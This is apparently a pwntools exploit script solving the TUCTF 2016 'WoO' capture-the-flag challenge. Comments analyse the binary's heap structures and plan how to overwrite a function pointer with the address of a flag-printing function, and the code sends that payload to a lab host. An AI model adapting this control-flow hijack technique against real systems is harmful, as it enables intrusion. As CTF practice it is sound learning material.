
################################################################################
# REFS:
#       - https://losfuzzys.github.io/writeup/2016/05/16/tuctf2016-WoO/
#       - https://advancedpersistentjest.com/2016/05/17/writeup-woo-woo2-woo2-fixed-tuctf/
################################################################################

################################################################################
# NOTE: 
#       GLOBAL structures that are passed around
#       - NamesArray[5]: Array of pointers to animal names
#       - DeadBeefIndex: Index in NamesArray of 0xdeadbeef pointer
#       FUNCTION makeBear
#       - Allocates 0x18 bytes for DeadBeef Struct
#         8 bytes [0xdeadbeef][0x00000000]
#         8 bytes [BEARNAME..][..........]
#         8 bytes [..........][(DWORD)BEAR_TYPE]
#       - Adds pointer to DeadBeef structure to NamesArray
#       - Sets DeadBeefIndex to DeadBeef structure in NamesArray
#       FUNCTION pwnMe
#       - Gets called when make animal choice is 0xl337
#       - Reads DeadBeef struct
#       - Asserts BEAR_TYPE = 0x3 
#       - Calls 0xdeadbeef <- Need to replace this address with l33tH4x0r
#                             function address (0x4008dd)
#       FUNCTION l33tH4x0r
#       - prints "flag.txt" file
#       FUNCTION makeTiger/makeLion
#       - Allocates 0x18 bytes for AnimalName struct
#         8 bytes [BEARNAME..][..........]
#         8 bytes [..........][..........]
#         8 bytes [..........][(DWORD)BEAR_TYPE]
#       - Adds pointer to NamesArray
#       FUNCTION deleteAnimal
#       - Takes in index {1...4}
#       - Frees pointer in NamesArray at specified index
#       - Does not decrement index pointer
################################################################################


################################################################################
# GOAL: Replace 0xdeadbeef with address of l33tH4x0r (0x4008dd)
################################################################################


################################################################################
# PLAN: 
#       - DeadBeefIndex is initialized to 0
#       - Make structure at index 0 using makeTiger command
#         8 bytes [0x004008dd][..........]
#         8 bytes [..........][..........]
#         8 bytes [..........][0x00000003]
#       - Input 0xl337 = 4919 to call pwnMe
################################################################################


from pwn import *

vulnbin = "3eee781e62327ae39b06fec160467d6dfabe7b1a"  # WoO
velf = ELF(vulnbin)

vp = remote("192.168.2.170", 15050)  # WoO
#vp = process(vulnbin)

# Start process
calltarget = velf.symbols["l33tH4x0r"]
malcontent = p64(calltarget)


# Read in Menu options; Create DeadBeef struct with pointer to l33tH4x0r func
vp.recvuntil("Enter your choice:")
vp.sendline("2") # makeTiger
vp.recvuntil("4: Caspian Tiger")
vp.sendline("3") # make Sumatran Tiger -- to satisfy Bear Type 3 check
vp.recvuntil("Enter name of tiger:")


################################################################################
# DEBUG: 
# print "l33tH4x0r function pointer: ", hexdump(malcontent)
# Attaching to process from gdb
#       1. Find process name
#          Make sure its running the process not the remote connection:
#          $ ps -aux | grep 3eee 
#       2. Attach to process with gdb
#          $ sudo gdb [PATH_TO_PROCESS_FILE] [PROCESS_PID]
################################################################################

# Pwning
vp.sendline(malcontent)
vp.recvuntil("Enter your choice:")
vp.sendline(str(0x1337))


#vp.interactive()
vp.clean_and_log()
vp.close()
